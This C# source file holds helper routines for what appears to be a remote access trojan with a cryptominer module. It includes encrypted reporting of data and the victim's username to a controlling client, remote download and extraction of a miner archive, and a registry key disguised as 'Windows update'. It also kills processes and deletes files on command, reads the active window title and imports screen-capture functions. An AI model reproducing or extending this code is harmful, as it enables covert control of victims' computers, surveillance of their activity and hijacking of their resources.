using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
namespace boulzar.Other
{
    public static class Helpers
    {
        #region Declartion 
        public static WebClient WBClient = new WebClient();
        public static string Line = Environment.NewLine;
        public static bool ismnrdw = false;
        public static bool IsNormalDw = false;
        public static bool isdwdone = false;
        #endregion

        #region Comunications
        public static void Send(DataType DType, byte[] Data)
        {
            try
            {
                if (Data == null) { return; }
                new Thread(() =>
                {
                    Thread.CurrentThread.IsBackground = true;


                    Data = AES.Encrypt(Data);
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(Convert.ToByte(DType));
                    ToSend.AddRange(Data);

                    Networking.MainClient.Send(ToSend.ToArray());
                    ToSend.Clear();
                }).Start();


            }
            catch
            {

            }


        }
        public static void Send_NoCrypt(DataType DType, byte[] Data)
        {
            try
            {
                new Thread(() =>
                {
                    Thread.CurrentThread.IsBackground = true;


                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(Convert.ToByte(DType));
                    ToSend.AddRange(Data);
                    Networking.MainClient.Send(ToSend.ToArray());
                    ToSend.Clear();
                }).Start();

            }
            catch
            {

            }


        }
        public static void SendError(Exception error)
        {
            try
            {
                string ErrorMessage = "Exception " + error.HResult + " From : " + Environment.UserName + @"\" + Csettings.Tag + Line +
                    "Message : " + error.Message + Line + Line + "StackTrace : " + Line;
                Send(DataType.Error, Getbytes(ErrorMessage));
            }
            catch (Exception ex)
            {
            }

        }
        public static void SendNotif(string Message)
        {
            try
            {
                string allstr = "Notification from >>> " + "(" + Environment.UserName + ")" + Environment.NewLine + Environment.NewLine + Message;
                Send(DataType.Notif, Getbytes(allstr));
            }
            catch (Exception ex)
            { }
        }
        #endregion

        #region Methods

        public static string ThreeNonZeroDigits(double value)
        {
            if (value >= 100)
            {
                // No digits after the decimal.
                return value.ToString("0,0");
            }
            else if (value >= 10)
            {
                // One digit after the decimal.
                return value.ToString("0.0");
            }
            else
            {
                // Two digits after the decimal.
                return value.ToString("0.00");
            }
        }
        public static string ToFileSize(this double value)
        {
            string[] suffixes = { "bytes", "KB", "MB", "GB",
        "TB", "PB", "EB", "ZB", "YB"};
            for (int i = 0; i < suffixes.Length; i++)
            {
                if (value <= (Math.Pow(1024, i + 1)))
                {
                    return ThreeNonZeroDigits(value /
                        Math.Pow(1024, i)) +
                        " " + suffixes[i];
                }
            }

            return ThreeNonZeroDigits(value /
                Math.Pow(1024, suffixes.Length - 1)) +
                " " + suffixes[suffixes.Length - 1];
        }
        public static string B64TOFILE(string value, string path)
        {
            value = DecompressString(value);
            var valueBytes = System.Convert.FromBase64String(value);

            File.WriteAllBytes(path, valueBytes);

            return "";
        }

        public static void CreateZipFile(string fileName, string[] files)
        {

            var zip = ZipFile.Open(fileName, ZipArchiveMode.Create);
            foreach (string file in files)
            {
                if (file == string.Empty)
                    continue;

                zip.CreateEntryFromFile(file, Path.GetFileName(file), CompressionLevel.Optimal);
            }

            zip.Dispose();
        }
        public static byte[] Getbytes(string str)
        {
            return Encoding.Default.GetBytes(str);
        }
        public static string Getstrings(byte[] byt)
        {
            return Encoding.Default.GetString(byt);
        }



        #region DW

        public static void Dw(string lnk, string pth)
        {
            try
            {
                if (WBClient.IsBusy)
                {

                    return  ;
                }

                isdwdone = false;
                ServicePointManager.Expect100Continue = true;
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                WBClient.DownloadFileCompleted += new AsyncCompletedEventHandler(Completed);
                WBClient.DownloadProgressChanged += new DownloadProgressChangedEventHandler(ProgressChanged);
                WBClient.DownloadFileAsync(new Uri(lnk), pth);
                 

            }
            catch (Exception ex)
            {

                Helpers.SendError(ex);
                
            }

        }
        public static void ProgressChanged(object sender, DownloadProgressChangedEventArgs e)
        {
            int progress;
            string downloaded = "";
            string Tosend = "";
            progress = e.ProgressPercentage;
            downloaded = string.Format("{0} MB's / {1} MB's",
                (e.BytesReceived / 1024d / 1024d).ToString("0.00"),
                (e.TotalBytesToReceive / 1024d / 1024d).ToString("0.00"));

            if (ismnrdw)
            {
                Tosend = "mnrdw~" + downloaded + "~" + progress.ToString();
                Send(DataType.dwprogress, Getbytes(Tosend));
            }


        }
        public static void Completed(object sender, AsyncCompletedEventArgs e)
        {

            if (ismnrdw)
            {
                ZipFile.ExtractToDirectory(Methods.mnr.mnr_dir + "random", Methods.mnr.mnr_dir);
                File.Delete(Methods.mnr.mnr_dir + "random");
                Helpers.Send(DataType.dwprogress, Helpers.Getbytes("mnrdw" + "done"));
                ismnrdw = false;
                WBClient.Dispose();
            }
            if (IsNormalDw)
            {
                isdwdone = true;
            }

        }
        #endregion

        #region Registry
        public static string ReadRegKey(string KeyName)
        {
            string val = "";
            try
            {
                Microsoft.Win32.RegistryKey key;
                key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Windows update\");

                if (string.IsNullOrEmpty(key.GetValue(KeyName).ToString()))
                {
                    val = "There is no key that goes by  " + KeyName + " in registry";
                }
                else
                {
                    val = key.GetValue(KeyName).ToString();
                }

                key.Close();

            }
            catch (Exception ex)
            {
                val = "Null";
            }
            return val;
        }
        public static void CreateRegKey(string KeyName, string Value)
        {
            Microsoft.Win32.RegistryKey key;
            key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Windows update");
            key.SetValue(KeyName, Value);
            key.Close();

        }
        #endregion

        #region Informations
        public static int GetCpu()
        {
            PerformanceCounter cpuCounter;
            cpuCounter = new PerformanceCounter();
            cpuCounter = new PerformanceCounter();
            cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
            cpuCounter.CategoryName = "Processor";
            cpuCounter.CounterName = "% Processor Time";
            cpuCounter.InstanceName = "_Total";


            cpuCounter.NextValue();
            Thread.Sleep(1000);
            return (int)cpuCounter.NextValue();

        }
        public static string GetRam()
        {
            string totalram = "";
            ObjectQuery objectQuery = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");
            ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(objectQuery);
            ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
            foreach (ManagementObject managementObject in managementObjectCollection)
            {
                totalram += managementObject["TotalVisibleMemorySize"] + "~";
                totalram += managementObject["FreePhysicalMemory"] + "~";

            }

            return totalram;
        }
        #endregion

        public static void killproc(string procname)
        {
            try
            {
                foreach (var process in Process.GetProcessesByName(procname))
                {
                    process.Kill();
                }
            }
            catch { }

        }

        public static void Deletefile(string path)
        {
            try
            {
                if (Directory.Exists(path))
                {
                    Directory.Delete(path, true);
                    SendNotif("The Directory >>>" + path + " Has been deleted succesfuly");
                }
                else if (File.Exists(path))
                {
                    File.Delete(path);
                    SendNotif("The File >>> " + path + " Has been deleted succesfuly");
                }
            }
            catch (Exception ex)
            {
                SendError(ex);
            }
        }
        public static string CompressString(string text)
        {
            byte[] buffer = Encoding.UTF8.GetBytes(text);
            var memoryStream = new MemoryStream();
            using (var gZipStream = new GZipStream(memoryStream, CompressionMode.Compress, true))
            {
                gZipStream.Write(buffer, 0, buffer.Length);
            }

            memoryStream.Position = 0;

            var compressedData = new byte[memoryStream.Length];
            memoryStream.Read(compressedData, 0, compressedData.Length);

            var gZipBuffer = new byte[compressedData.Length + 4];
            Buffer.BlockCopy(compressedData, 0, gZipBuffer, 4, compressedData.Length);
            Buffer.BlockCopy(BitConverter.GetBytes(buffer.Length), 0, gZipBuffer, 0, 4);
            return Convert.ToBase64String(gZipBuffer);
        }
        public static string DecompressString(string compressedText)
        {

            byte[] gZipBuffer = Convert.FromBase64String(compressedText);
            using (var memoryStream = new MemoryStream())
            {
                int dataLength = BitConverter.ToInt32(gZipBuffer, 0);
                memoryStream.Write(gZipBuffer, 4, gZipBuffer.Length - 4);

                var buffer = new byte[dataLength];

                memoryStream.Position = 0;
                using (var gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress))
                {
                    gZipStream.Read(buffer, 0, buffer.Length);
                }

                return Encoding.UTF8.GetString(buffer);
            }
        }

        public static string GetSubstringByString(string a, string b, string c)
        {
            try
            {
                return c.Substring(c.IndexOf(a) + a.Length, c.IndexOf(b) - c.IndexOf(a) - a.Length);
            }
            catch
            {
                return "";
            }
        }

        #region NativeMethods 
        [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateDC(string lpszDriver, string lpszDevice, string lpszOutput, IntPtr lpInitData);

        [DllImport("gdi32.dll")]
        public static extern bool DeleteDC([In] IntPtr hdc);
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        public static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }
        #endregion


        #endregion

    }
}
